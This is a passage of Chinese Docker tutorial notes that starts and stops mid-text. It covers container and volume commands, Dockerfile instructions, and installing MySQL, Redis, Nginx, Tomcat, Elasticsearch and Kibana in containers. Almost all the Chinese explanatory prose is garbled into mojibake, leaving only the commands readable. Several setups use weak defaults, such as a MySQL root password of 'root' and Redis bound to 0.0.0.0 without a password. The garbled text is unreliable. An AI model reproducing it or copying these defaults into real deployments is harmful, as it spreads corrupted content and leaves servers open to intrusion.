¥å®¹å¨æ§è¡å½ä»¤\n-i\t\tä»¥äº¤äºæ¨¡å¼è¿è¡å®¹å¨ï¼éå¸¸ä¸-tä¸èµ·ä½¿ç¨\n-t\t\tåéä¸ä¸ªä¼ªç»ç«¯    shellçªå£   bash \n\n# 9.å®¹å¨åå®¿ä¸»æºä¹é´å¤å¶æä»¶\ndocker cp æä»¶|ç®å½ å®¹å¨id:å®¹å¨è·¯å¾           -----------------   å°å®¿ä¸»æºå¤å¶å°å®¹å¨åé¨\ndocker cp å®¹å¨id:å®¹å¨åèµæºè·¯å¾ å®¿ä¸»æºç®å½è·¯å¾  -----------------   å°å®¹å¨åèµæºæ·è´å°ä¸»æºä¸\n\n# 10.æ°æ®å·(volum)å®ç°ä¸å®¿ä¸»æºå±äº«ç®å½\ndocker run -v å®¿ä¸»æºçè·¯å¾|ä»»æå«å:/å®¹å¨åçè·¯å¾ éåå\næ³¨æ: \n1.å¦ææ¯å®¿ä¸»æºè·¯å¾å¿é¡»æ¯ç»å¯¹è·¯å¾,å®¿ä¸»æºç®å½ä¼è¦çå®¹å¨åç®å½åå®¹\n2.å¦ææ¯å«ååä¼å¨dockerè¿è¡å®¹å¨æ¶èªå¨å¨å®¿ä¸»æºä¸­åå»ºä¸ä¸ªç®å½,å¹¶å°å®¹å¨ç®å½æä»¶å¤å¶å°å®¿ä¸»æºä¸­\n\n# 11.æåéå\ndocker save éåå -o  åç§°.tar\n\n# 12.è½½å¥éå\ndocker load -i   åç§°.tar\n\n# 13.å®¹å¨æåææ°çéå\ndocker commit -m "æè¿°ä¿¡æ¯" -a "ä½èä¿¡æ¯"   ï¼å®¹å¨idæèåç§°ï¼æåçéååç§°:æ ç­¾\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n\n\n# æ°å»ºå¹¶è¿è¡å®¹å¨\n\ndocker run [OPTIONS] IMAGE [COMMAND] [ARG...]\noptionsï¼\n--name="å®¹å¨æ°åå­": ä¸ºå®¹å¨æå®ä¸ä¸ªåç§°ï¼\n-d: åå°è¿è¡å®¹å¨ï¼å¹¶è¿åå®¹å¨IDï¼ä¹å³å¯å¨å®æ¤å¼å®¹å¨ï¼\n-iï¼ä»¥äº¤äºæ¨¡å¼è¿è¡å®¹å¨ï¼éå¸¸ä¸ -t åæ¶ä½¿ç¨ï¼\n-tï¼ä¸ºå®¹å¨éæ°åéä¸ä¸ªä¼ªè¾å¥ç»ç«¯ï¼éå¸¸ä¸ -i åæ¶ä½¿ç¨ï¼\n-P: éæºç«¯å£æ å°ï¼\n-p: æå®ç«¯å£æ å°ï¼æä»¥ä¸åç§æ ¼å¼\n      ip:hostPort:containerPort\n      ip::containerPort\n      **hostPort:containerPort**\n      containerPort\n\ne.g.\ndocker run --name centos_demo01 -t -i centos  # äº¤äºå¼æ¹å¼è¿è¡\ndocker run -d --name tomcat_demo01 -p 8081:8080 tomcat # åå°è¿è¡\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# æ¥çå®¹å¨\n\ndocker ps [options]\n\noptions:\n\t-a    æ¥çææå®¹å¨åæ¬æ­£å¨è¿è¡ååæ­¢ç\n\t-q    æ¾ç¤ºid\n  -n    æ¾ç¤ºæè¿åå»ºçnä¸ªå®¹å¨\n\t-l    æ¾ç¤ºæè¿åå»ºçå®¹å¨\n\t--no-stunc    ä¸æªæ­è¾åº\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# éåºå®¹å¨çä¸¤ç§æ¹å¼\n\nexit  # å®¹å¨åæ­¢\nCTRL+p+q\n\n\n1\n2\n\n\n# å®¹å¨çå¯å¨ãåæ­¢ãéå¯ãå¼ºå¶å³é­\n\ndocker start xxx \ndocker stop xxx\ndocker restart xxx\ndocker kill xxx\n\n\n1\n2\n3\n4\n\n\n# å é¤å®¹å¨\n\ndocker rm -f $(docker ps -aq) # å¼ºå¶å é¤å¨é¨å®¹å¨               = docker ps -qa |Xargs docker rm -f\n\n\n1\n\n\n# æ¥çå®¹å¨æ¥å¿\n\ndocker logs [options] å®¹å¨id\noptionsï¼\n\t-t æ¶é´æ³\n\t-f è·éææ°æ¥å¿\n\t--tail æ°å­åæ¾ç¤ºå¤å°æ¡\n\n\n1\n2\n3\n4\n5\n\n\n# æ¥çå®¹å¨åè¿ç¨\n\ndocker top å®¹å¨id\n\n\n1\n\n\n# æ¥çå®¹å¨åé¨ç»è\n\ndocker inspect å®¹å¨id\n\n\n1\n\n\n# éæ°è¿å¥æ­£å¨è¿è¡çå®¹å¨\n\ndocker exec -it å®¹å¨id /bin/bash  # æå¼æ°çç»ç«¯   æ°è¿ç¨ ä»¥è¿ç§æ¹å¼è¿å¥exitä¸ä¼ç»æå®¹å¨çè¿è¡\ndocker attach å®¹å¨id   # ç´æ¥è¿å¥å®¹å¨å¯å¨çå½ä»¤è¡ç»ç«¯\n\n\n1\n2\n\n\n# æä»¶ç¸äºæ·è´\n\ndocker cp å®¹å¨id:å®¹å¨è·¯å¾ æ¬æºè·¯å¾\ndocker cp æ¬æºè·¯å¾ å®¹å¨id:å®¹å¨åè·¯å¾\n\n\n1\n2\n\n\n# å°å®¹å¨ä¿å­ä¸ºéå\n\ndocker commit -p å®¹å¨åç§° docker.io/zhangsan404/alpine:test_01\n\n\n1\n\n\n\n# éå\n\n\n# UnionFS - èåæä»¶ç³»ç»\n\n> UnionFSï¼èåæä»¶ç³»ç»ï¼ï¼Unionæä»¶ç³»ç»ï¼UnionFSï¼æ¯ä¸ç§åå±ãè½»éçº§å¹¶ä¸é«æ§è½çæä»¶ç³»ç»ï¼å®æ¯æå¯¹æä»¶ç³»ç»çä¿®æ¹ä½ä¸ºä¸æ¬¡æäº¤æ¥ä¸å±å±çå å ï¼åæ¶å¯ä»¥å°ä¸åç®å½æè½½å°åä¸ä¸ªèææä»¶ç³»ç»ä¸(unite several directories into a single virtual filesystem)ãUnion æä»¶ç³»ç»æ¯ Docker éåçåºç¡ãéåå¯ä»¥éè¿åå±æ¥è¿è¡ç»§æ¿ï¼åºäºåºç¡éåï¼æ²¡æç¶éåï¼ï¼å¯ä»¥å¶ä½åç§å·ä½çåºç¨éåã\n\n\n# Dockeréåå è½½åç\n\ndockerçéåå®éä¸ç±ä¸å±ä¸å±çæä»¶ç³»ç»ç»æï¼è¿ç§å±çº§çæä»¶ç³»ç»UnionFSã\n\nbootfs(boot file system)ä¸»è¦åå«bootloaderåkernel, bootloaderä¸»è¦æ¯å¼å¯¼å è½½kernel, Linuxåå¯å¨æ¶ä¼å è½½bootfsæä»¶ç³»ç»ï¼å¨Dockeréåçæåºå±æ¯bootfsãè¿ä¸å±ä¸æä»¬å¸åçLinux/Unixç³»ç»æ¯ä¸æ ·çï¼åå«bootå è½½å¨ååæ ¸ãå½bootå è½½å®æä¹åæ´ä¸ªåæ ¸å°±é½å¨åå­ä¸­äºï¼æ­¤æ¶åå­çä½¿ç¨æå·²ç±bootfsè½¬äº¤ç»åæ ¸ï¼æ­¤æ¶ç³»ç»ä¹ä¼å¸è½½bootfsã\n\nrootfs (root file system) ï¼å¨bootfsä¹ä¸ãåå«çå°±æ¯å¸å Linux ç³»ç»ä¸­ç /dev, /proc, /bin, /etc ç­æ åç®å½åæä»¶ãrootfså°±æ¯åç§ä¸åçæä½ç³»ç»åè¡çï¼æ¯å¦Ubuntuï¼Centosç­ç­ã\n\n\n\n\n# Docker commit\n\n> Docker commit å¯ä»¥å°ä¸ä¸ªå®¹å¨æåä¸ºéåã\n\ndocker commit -m="æè¿°ä¿¡æ¯" -a="ä½è" å®¹å¨id éååç§°:tag\n\ne.g.\ndocker commit -m="tomcat with demo/helloworld" -a="jm" 0179893d97e7 jm/tomcat:1.2\n\n\n1\n2\n3\n4\n\n\n\n\n\n# å®¹å¨æ°æ®å·\n\n> Dockerå®¹å¨äº§ççæ°æ®ï¼å¦æä¸éè¿docker commitçææ°çéåï¼ä½¿å¾æ°æ®åä¸ºéåçä¸é¨åä¿å­ä¸æ¥ï¼é£ä¹å½å®¹å¨å é¤åï¼æ°æ®èªç¶ä¹å°±æ²¡æäºã ä¸ºäºè½ä¿å­æ°æ®å¨dockerä¸­æä»¬ä½¿ç¨å®¹å¨æ°æ®å·ã\n\nå·å°±æ¯ç®å½ææä»¶ï¼å­å¨äºä¸ä¸ªæå¤ä¸ªå®¹å¨ä¸­ï¼ç±dockeræè½½å°å®¹å¨ï¼ä½ä¸å±äºèåæä»¶ç³»ç»ï¼å æ­¤è½å¤ç»è¿Union File Systemæä¾ä¸äºç¨äºæç»­å­å¨æå±äº«æ°æ®çç¹æ§ã\n\nå·çè®¾è®¡ç®çå°±æ¯æ°æ®çæä¹åï¼å®å¨ç¬ç«äºå®¹å¨ççå­å¨æï¼å æ­¤Dockerä¸ä¼å¨å®¹å¨å é¤æ¶å é¤å¶æè½½çæ°æ®å·\n\nç¹ç¹ï¼\n\n1ï¼æ°æ®å·å¯å¨å®¹å¨ä¹é´å±äº«æéç¨æ°æ® 2ï¼å·ä¸­çæ´æ¹å¯ä»¥ç´æ¥çæ 3ï¼æ°æ®å·ä¸­çæ´æ¹ä¸ä¼åå«å¨éåçæ´æ°ä¸­ 4ï¼æ°æ®å·ççå½å¨æä¸ç´æç»­å°æ²¡æå®¹å¨ä½¿ç¨å®ä¸ºæ­¢\n\n\n# å½ä»¤è¡åå»ºå®¹å¨æ°æ®å·\n\n# åå»ºå®¹å¨å·\n\n\tdocker run -ti --name demo01 -v ~/myfile:/opt:ro centos:latest # å¸¦æé\n\n\n1\n\n\n# æ¥çå®¹å¨å·æè½½æåµ\n\ndocker inspect demo01  # æ¥çå®¹å¨è¯¦ç»ä¿¡æ¯\n\n\n1\n\n\n\n\n\n# Dockerfileåå»ºå®¹å¨æ°æ®å·\n\n 1. åå»ºä¸ä¸ªæä»¶å¤¹\n\nmkdir MyDockerfile\n\n\n1\n\n 2. åå»ºDockerfileæä»¶\n\nvim Dockerfile\n\nFROM centos   # å¯¼å¥centoséå\nVOLUME ["/dataVolumeContainer1","/dataVolumeContainer2"]  # åå»ºä¸¤ä¸ªå®¹å¨æ°æ®å·ï¼ç±äºä¸»æºçæä»¶å¤¹æ æ³æå®ï¼è¿éçå®¹å¨æ°æ®å·åªædockeræ¹åç\nCMD echo "finished,--------success1"\nCMD /bin/bash  # æ§è¡bash\n\n\n1\n2\n3\n4\n5\n6\n\n 3. æå»ºå®¹å¨\n\ndocker build -f dockerfileä½ç½® -t è¾åºçéååç§° . # å½åç®å½\n\ne.g.\ndocker build -f ~/MyDockerfile/Dockerfile -t jm/centos_jm:1.1 .\n\n\n1\n2\n3\n4\n\n\n\n\né»è®¤ä¸»æºç«¯æ°æ®å·å¯¹æ¥ä½ç½®ï¼\n\n\n\n\n# æ°æ®å·å®¹å¨\n\n> å½åçå®¹å¨æè½½æ°æ®å·ï¼å¶å®å®¹å¨éè¿æè½½è¿ä¸ª(ç¶å®¹å¨)å®ç°æ°æ®å±äº«ï¼æè½½æ°æ®å·çå®¹å¨ï¼ç§°ä¹ä¸ºæ°æ®å·å®¹å¨\n\nåå»ºç¶å®¹å¨\n\ndocker run -ti --name dc01 jm/jm_centos:1.0\n\n\n1\n\n\nåå»ºå­å®¹å¨\n\ndocker run -ti --name dc02 --volumes-from dc01 jm/jm_centos:1.0\n\n\n1\n\n\nå­å®¹å¨åç¶å®¹å¨å±äº«æ°æ®å·ï¼å½ç¶å®¹å¨å é¤æ¶ï¼å­å®¹å¨åå®¹ä¸ä¼å é¤ãå¯ä»¥çè§£ä¸ºå®¹å¨åæ°æ®å·åç¦»ï¼å®¹å¨æ²¡äºï¼æ°æ®å·è¿å¨ã\n\n\n# Dockerå®è£å¸¸è§çæå¡\n\n\n# Docker å®è£ Mysql\n\n# 1.æåmysqléåå°æ¬å°\ndocker pull mysql:tag (tagä¸å é»è®¤ææ°çæ¬)\n\n# 2.è¿è¡mysqlæå¡\ndocker run --name mysql -e MYSQL_ROOT_PASSWORD=root -d mysql:tag  \t\t\t\t\t\t  --æ²¡ææ´é²å¤é¨ç«¯å£å¤é¨ä¸è½è¿æ¥\ndocker run --name mysql -e MYSQL_ROOT_PASSWORD=root -p 3306:3306 -d  mysql:tag  --æ²¡ææ´é²å¤é¨ç«¯å£\n\n# 3.è¿å¥mysqlå®¹å¨\ndocker exec -it å®¹å¨åç§°|å®¹å¨id bash\n\n# 4.å¤é¨æ¥çmysqlæ¥å¿\ndocker logs å®¹å¨åç§°|å®¹å¨id\n\n# 5.ä½¿ç¨èªå®ä¹éç½®åæ°\ndocker run --name mysql -v /root/mysql/conf.d:/etc/mysql/conf.d -e MYSQL_ROOT_PASSWORD=root -d mysql:tag\n\n# 6.å°å®¹å¨æ°æ®ä½ç½®ä¸å®¿ä¸»æºä½ç½®æè½½ä¿è¯æ°æ®å®å¨\ndocker run --name mysql -v /root/mysql/data:/var/lib/mysql -v /root/mysql/conf.d:/etc/mysql/conf.d -e MYSQL_ROOT_PASSWORD=root -p 3306:3306 -d mysql:tag\n\n# 7.éè¿å¶ä»å®¢æ·ç«¯è®¿é® å¦å¨windowç³»ç»|macosç³»ç»ä½¿ç¨å®¢æ·ç«¯å·¥å·è®¿é®\n\n# 8.å°mysqlæ°æ®åºå¤ä»½ä¸ºsqlæä»¶\ndocker exec mysql|å®¹å¨id sh -c \'exec mysqldump --all-databases -uroot -p"$MYSQL_ROOT_PASSWORD"\' > /root/all-databases.sql  --å¯¼åºå¨é¨æ°æ®\ndocker exec mysql sh -c \'exec mysqldump --databases åºè¡¨ -uroot -p"$MYSQL_ROOT_PASSWORD"\' > /root/all-databases.sql  --å¯¼åºæå®åºæ°æ®\ndocker exec mysql sh -c \'exec mysqldump --no-data --databases åºè¡¨ -uroot -p"$MYSQL_ROOT_PASSWORD"\' > /root/all-databases.sql  --å¯¼åºæå®åºæ°æ®ä¸è¦æ°æ®\n\n# 9.æ§è¡sqlæä»¶å°mysqlä¸­\ndocker exec -i mysql sh -c \'exec mysql -uroot -p"$MYSQL_ROOT_PASSWORD"\' < /root/xxx.sql\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n\n# Dockerå®è£Redis\n\n# 1.å¨docker hubæç´¢rediséå\ndocker search redis\n\n# 2.æårediséåå°æ¬å°\ndocker pull redis\n\n# 3.å¯å¨redisæå¡è¿è¡å®¹å¨\ndocker run --name redis -d redis:tag (æ²¡ææ´é²å¤é¨ç«¯å£)\ndocker run --name redis -p 6379:6379 -d redis:tag (æ´é²å¤é¨å®¿ä¸»æºç«¯å£ä¸º6379è¿è¡è¿æ¥) \n\n# 4.æ¥çå¯å¨æ¥å¿\ndocker logs -t -f å®¹å¨id|å®¹å¨åç§°\n\n# 5.è¿å¥å®¹å¨åé¨æ¥ç\ndocker exec -it å®¹å¨id|åç§° bash  \n\n# 6.å è½½å¤é¨èªå®ä¹éç½®å¯å¨rediså®¹å¨\né»è®¤æåµä¸rediså®æ¹éåä¸­æ²¡æredis.conféç½®æä»¶ éè¦å»å®ç½ä¸è½½æå®çæ¬çéç½®æä»¶\n1. wget http://download.redis.io/releases/redis-5.0.8.tar.gz  ä¸è½½å®æ¹å®è£å\n2. å°å®æ¹å®è£åä¸­éç½®æä»¶è¿è¡å¤å¶å°å®¿ä¸»æºæå®ç®å½ä¸­å¦ /root/redis/redis.confæä»¶\n3. ä¿®æ¹éè¦èªå®ä¹çéç½®\nbind 0.0.0.0 å¼å¯è¿ç¨æé\nappenonly yes å¼å¯aofæä¹å\n4. å è½½éç½®å¯å¨\ndocker run --name redis -v /root/redis:/usr/local/etc/redis -p 6379:6379 -d redis redis-server /usr/local/etc/redis/redis.conf  \n\n# 7.å°æ°æ®ç®å½æå¨å°æ¬å°ä¿è¯æ°æ®å®å¨\ndocker run --name redis -v /root/redis/data:/data -v /root/redis/redis.conf:/usr/local/etc/redis/redis.conf -p 6379:6379 -d redis redis-server \t\t\t\t\t/usr/local/etc/redis/redis.conf  \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n\n# Docker å®è£ nginx\n\n# 1.å¨docker hubæç´¢nginx\ndocker search nginx\n\n# 2.æånginxéåå°æ¬å°\n[root@localhost ~]# docker pull nginx\nUsing default tag: latest\nlatest: Pulling from library/nginx\nafb6ec6fdc1c: Pull complete \nb90c53a0b692: Pull complete \n11fa52a0fdc0: Pull complete \nDigest: sha256:30dfa439718a17baafefadf16c5e7c9d0a1cde97b4fd84f63b69e13513be7097\nStatus: Downloaded newer image for nginx:latest\ndocker.io/library/nginx:latest\n\n# 3.å¯å¨nginxå®¹å¨\ndocker run -p 80:80 --name nginx01 -d nginx\n\n# 4.è¿å¥å®¹å¨\ndocker exec -it nginx01 /bin/bash\næ¥æ¾ç®å½:  whereis nginx\néç½®æä»¶:  /etc/nginx/nginx.conf\n\n# 5.å¤å¶éç½®æä»¶å°å®¿ä¸»æº\ndocker cp nginx01(å®¹å¨id|å®¹å¨åç§°):/etc/nginx/nginx.conf å®¿ä¸»æºåå½\n\n# 6.æå¨nginxéç½®ä»¥åhtmlå°å®¿ä¸»æºå¤é¨\ndocker run --name nginx02 -v /root/nginx/nginx.conf:/etc/nginx/nginx.conf -v /root/nginx/html:/usr/share/nginx/html -p 80:80 -d nginx\t\t\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# Docker å®è£ Tomcat\n\n# 1.å¨docker hubæç´¢tomcat\ndocker search tomcat\n\n# 2.ä¸è½½tomcatéå\ndocker pull tomcat\n\n# 3.è¿è¡tomcatéå\ndocker run -p 8080:8080 -d --name mytomcat tomcat\n\n# 4.è¿å¥tomcatå®¹å¨\ndocker exec -it mytomcat /bin/bash\n\n# 5.å°webappsç®å½æè½½å¨å¤é¨\ndocker run -p 8080:8080 -v /root/webapps:/usr/local/tomcat/webapps -d --name mytomcat tomcat\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# Docker å®è£ ES\n\n# 0. æåéå å¯å¨å®¹å¨\n\n# 1.dockerhub æåéå\n\tdocker pull elasticsearch:6.4.2\n# 2.æ¥çdockeréå\n\tdocker images\n# 3.è¿è¡dockeréå\n\tdocker run -p 9200:9200 -p 9300:9300 elasticsearch:6.4.2\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n\n# 1. è¿è¡ç¸å³çéç½®\n\n# 1.å¨centosèææºä¸­ï¼ä¿®æ¹éç½®sysctl.conf\n\tvim /etc/sysctl.conf\n# 2.å å¥å¦ä¸éç½®\n\tvm.max_map_count=262144 \n# 3.å¯ç¨éç½®\n\tsysctl -p\n\tæ³¨ï¼è¿ä¸æ­¥æ¯ä¸ºäºé²æ­¢å¯å¨å®¹å¨æ¶ï¼æ¥åºå¦ä¸éè¯¯ï¼\n\tbootstrap checks failed max virtual memory areas vm.max_map_count [65530] likely too low, increase to at least [262144]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# 2. å¯å¨å®¹å¨\n\n# 0.å¤å¶å®¹å¨ä¸­dataç®å½å°å®¿ä¸»æºä¸­\ndocker cp å®¹å¨id:/usr/share/share/elasticsearch/data /root/es\n# 1.è¿è¡ESå®¹å¨ æå®jvmåå­å¤§å°å¹¶æå®ikåè¯å¨ä½ç½®\ndocker run -d --name es -p 9200:9200 -p 9300:9300 -e ES_JAVA_OPTS="-Xms128m -Xmx128m" -v /root/es/plugins:/usr/share/elasticsearch/plugins -v /root/es/data:/usr/share/elasticsearch/data elasticsearch:6.4.2\n\n\n1\n2\n3\n4\n\n\n# 3.å®è£IKåè¯å¨\n\n# 1.ä¸è½½å¯¹åºçæ¬çIKåè¯å¨\nwget https://github.com/medcl/elasticsearch-analysis-ik/releases/download/v6.4.2/elasticsearch-analysis-ik-6.4.2.zip\n\n# 2.è§£åå°pluginsæä»¶å¤¹ä¸­\nyum install -y unzip\nunzip -d ik elasticsearch-analysis-ik-6.4.2.zip\n\n# 3.æ·»å èªå®ä¹æ©å±è¯ååç¨è¯\ncd plugins/elasticsearch/config\nvim IKAnalyzer.cfg.xml\n<properties>\n<comment>IK Analyzer æ©å±éç½®</comment>\n\x3c!--ç¨æ·å¯ä»¥å¨è¿ééç½®èªå·±çæ©å±å­å¸ --\x3e\n<entry key="ext_dict">ext_dict.dic</entry>\n\x3c!--ç¨æ·å¯ä»¥å¨è¿ééç½®èªå·±çæ©å±åæ­¢è¯å­å¸--\x3e\n<entry key="ext_stopwords">ext_stopwords.dic</entry>\n</properties>\n\n# 4.å¨ikåè¯å¨ç®å½ä¸configç®å½ä¸­åå»ºext_dict.dicæä»¶   ç¼ç ä¸å®è¦ä¸ºUTF-8æè½çæ\nvim ext_dict.dic å å¥æ©å±è¯å³å¯\n# 5. å¨ikåè¯å¨ç®å½ä¸configç®å½ä¸­åå»ºext_stopword.dicæä»¶ \nvim ext_stopwords.dic å å¥åç¨è¯å³å¯\n\n# 6.éå¯å®¹å¨çæ\ndocker restart å®¹å¨id\n# 7.å°æ­¤å®¹å¨æäº¤æä¸ºä¸ä¸ªæ°çéå\ndocker commit -a="xiaochen" -m="es with IKAnalyzer" å®¹å¨id xiaochen/elasticsearch:6.4.2\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n# 4. å®è£Kibana\n\n# 1.ä¸è½½kibanaéåå°æ¬å°\ndocker pull kibana:6.4.2\n\n# 2.å¯å¨kibanaå®¹å¨\ndocker run -d --name kibana -e ELASTICSEARCH_URL=http://10.15.0.3:9200 -p 5601:5601 kibana:6.4.2\n\n\n1\n2\n3\n4\n5\n\n\n\n# Docker å¸¸è§é®é¢å¤ç½®\n\n[root@localhost ~]# docker search mysql æè docker pull è¿äºå½ä»¤æ æ³ä½¿ç¨\nError response from daemon: Get https://index.docker.io/v1/search?q=mysql&n=25: x509: certificate has expired or is not yet valid\n\n\n1\n2\n\n\n\n\næ³¨æ:è¿ä¸ªéè¯¯çåå å¨äºæ¯ç³»ç»çæ¶é´ådocker hubæ¶é´ä¸ä¸è´,éè¦åç³»ç»æ¶é´ä¸ç½ç»æ¶é´åæ­¥\n\n# 1.å®è£æ¶é´åæ­¥\n\tsudo yum -y install ntp ntpdate\n# 2.åæ­¥æ¶é´\n\tsudo ntpdate cn.pool.ntp.org\n# 3.æ¥çæ¬æºæ¶é´\n\tdate\n# 4.ä»æ°æµè¯\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# Dockerfile\n\n> Dockerfileæ¯ç¨æ¥æå»ºDockeréåçæå»ºæä»¶ï¼æ¯ç±ä¸ç³»åå½ä»¤ååæ°ææçèæ¬ã\n\n\n# ä»ä¹æ¯Dockerfile\n\nDockerfileå¯ä»¥è®¤ä¸ºæ¯Dockeréåçæè¿°æä»¶ï¼æ¯ç±ä¸ç³»åå½ä»¤ååæ°ææçèæ¬ãä¸»è¦ä½ç¨æ¯ç¨æ¥æå»ºdockeréåçæå»ºæä»¶ã\n\n\n\n * éè¿æ¶æå¾å¯ä»¥çåºéè¿DockerFileå¯ä»¥ç´æ¥æå»ºéå\n\n\n# Dockerfileè§£æè¿ç¨\n\n\n\n\n# Dockerfileçä¿çå½ä»¤\n\nå®æ¹è¯´æ:https://docs.docker.com/engine/reference/builder/\n\nä¿çå­          ä½ç¨\nFROM         å½åéåæ¯åºäºåªä¸ªéåç ç¬¬ä¸ä¸ªæä»¤å¿é¡»æ¯FROM\nMAINTAINER   éåç»´æ¤èçå§ååé®ç®±å°å\nRUN          æå»ºéåæ¶éè¦è¿è¡çæä»¤\nEXPOSE       å½åå®¹å¨å¯¹å¤æ´é²åºçç«¯å£å·\nWORKDIR      æå®å¨åå»ºå®¹å¨åï¼ç»ç«¯é»è®¤ç»å½è¿æ¥çå·¥ä½ç®å½ï¼ä¸ä¸ªè½èç¹\nENV          ç¨æ¥å¨æå»ºéåè¿ç¨ä¸­è®¾ç½®ç¯å¢åé\nADD          å°å®¿ä¸»æºç®å½ä¸çæä»¶æ·è´è¿éåä¸ADDå½ä»¤ä¼èªå¨å¤çURLåè§£åtarå\nCOPY         ç±»ä¼¼äºADDï¼æ·è´æä»¶åç®å½å°éåä¸­\n             å°ä»æå»ºä¸ä¸æç®å½ä¸­<åè·¯å¾>çæä»¶/ç®å½å¤å¶å°æ°çä¸å±çéååç<ç®æ è·¯å¾>ä½ç½®\nVOLUME       å®¹å¨æ°æ®å·ï¼ç¨äºæ°æ®ä¿å­åæä¹åå·¥ä½\nCMD          æå®ä¸ä¸ªå®¹å¨å¯å¨æ¶è¦è¿è¡çå½ä»¤\n             Dockerfileä¸­å¯ä»¥æå¤ä¸ªCMDæä»¤ï¼ä½åªææåä¸ä¸ªçæï¼CMDä¼è¢«docker runä¹åçåæ°æ¿æ¢\nENTRYPOINT   æå®ä¸ä¸ªå®¹å¨å¯å¨æ¶è¦è¿è¡çå½ä»¤\n             ENTRYPOINTçç®çåCMDä¸æ ·ï¼é½æ¯å¨æå®å®¹å¨å¯å¨ç¨åºåå¶åæ°\n\n# FROM\n\n * åºäºé£ä¸ªéåè¿è¡æå»ºæ°çéå,å¨æå»ºæ¶ä¼èªå¨ä»docker hubæåbaseéå å¿é¡»ä½ä¸ºDockerfileçç¬¬ä¸ä¸ªæä»¤åºç°\n\n * è¯­æ³:\n   \n   FROM  <image>\n   FROM  <image>[:<tag>]     ä½¿ç¨çæ¬ä¸åä¸ºlatest\n   FROM  <image>[@<digest>]  ä½¿ç¨æè¦\n   \n   \n   1\n   2\n   3\n   \n\n# MAINTAINER\n\n * éåç»´æ¤èçå§ååé®ç®±å°å[åºå¼]\n\n * è¯­æ³:\n   \n   MAINTAINER <name>\n   \n   \n   1\n   \n\n# RUN\n\n * RUNæä»¤å°å¨å½åæ åä¹ä¸çæ°å±ä¸­æ§è¡ä»»ä½å½ä»¤å¹¶æäº¤ç»æãçæçæäº¤æ åå°ç¨äºDockerfileä¸­çä¸ä¸æ­¥\n\n * è¯­æ³:\n   \n   RUN <command> (shell form, the command is run in a shell, which by default is /bin/sh -c on Linux or cmd /S /C on Windows)\n   RUN echo hello\n   \n   RUN ["executable", "param1", "param2"] (exec form)\n   RUN ["/bin/bash", "-c", "echo hello"]\n   \n   \n   1\n   2\n   3\n   4\n   5\n   \n\n# EXPOSE\n\n * ç¨æ¥æå®æå»ºçéåå¨è¿è¡ä¸ºå®¹å¨æ¶å¯¹å¤æ´é²çç«¯å£\n\n * è¯­æ³:\n   \n   EXPOSE 80/tcp  å¦ææ²¡ææ¾ç¤ºæå®åé»è®¤æ´é²é½æ¯tcp\n   EXPOSE 80/udp\n   \n   \n   1\n   2\n   \n\n# CMD\n\n * ç¨æ¥ä¸ºå¯å¨çå®¹å¨æå®æ§è¡çå½ä»¤,å¨Dockerfileä¸­åªè½æä¸æ¡CMDæä»¤ãå¦æååºå¤ä¸ªå½ä»¤ï¼ååªææåä¸ä¸ªå½ä»¤æä¼çæã\n\n * æ³¨æ: Dockerfileä¸­åªè½æä¸æ¡CMDæä»¤ãå¦æååºå¤ä¸ªå½ä»¤ï¼ååªææåä¸ä¸ªå½ä»¤æä¼çæã\n\n * è¯­æ³:\n   \n   CMD ["executable","param1","param2"] (exec form, this is the preferred form)\n   CMD ["param1","param2"] (as default parameters to ENTRYPOINT)\n   CMD command param1 param2 (shell form)\n   \n   \n   1\n   2\n   3\n   \n\n# WORKDIR\n\n * ç¨æ¥ä¸ºDockerfileä¸­çä»»ä½RUNãCMDãENTRYPOINTãCOPYåADDæä»¤è®¾ç½®å·¥ä½ç®å½ãå¦æWORKDIRä¸å­å¨ï¼å³ä½¿å®æ²¡æå¨ä»»ä½åç»­Dockerfileæä»¤ä¸­ä½¿ç¨ï¼å®ä¹å°è¢«åå»ºã\n\n * è¯­æ³:\n   \n   WORKDIR /path/to/workdir\n   \n   WORKDIR /a\n   WORKDIR b\n   WORKDIR c\n   `æ³¨æ:WORKDIRæä»¤å¯ä»¥å¨Dockerfileä¸­å¤æ¬¡ä½¿ç¨ãå¦ææä¾äºç¸å¯¹è·¯å¾ï¼åè¯¥è·¯å¾å°ä¸ååWORKDIRæä»¤çè·¯å¾ç¸å¯¹`\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   \n\n# ENV\n\n * ç¨æ¥ä¸ºæå»ºéåè®¾ç½®ç¯å¢åéãè¿ä¸ªå¼å°åºç°å¨æå»ºé¶æ®µä¸­ææåç»­æä»¤çç¯å¢ä¸­ã\n\n * è¯­æ³ï¼\n   \n   ENV <key> <value>\n   ENV <key>=<value> ...\n   \n   \n   1\n   2\n   \n\n# ADD\n\n * ç¨æ¥ä»contextä¸ä¸æå¤å¶æ°æä»¶ãç®å½æè¿ç¨æä»¶urlï¼å¹¶å°å®ä»¬æ·»å å°ä½äºæå®è·¯å¾çæ åæä»¶ç³»ç»ä¸­ã\n\n * è¯­æ³:\n   \n   ADD hom* /mydir/       ééç¬¦æ·»å å¤ä¸ªæä»¶\n   ADD hom?.txt /mydir/   ééç¬¦æ·»å \n   ADD test.txt 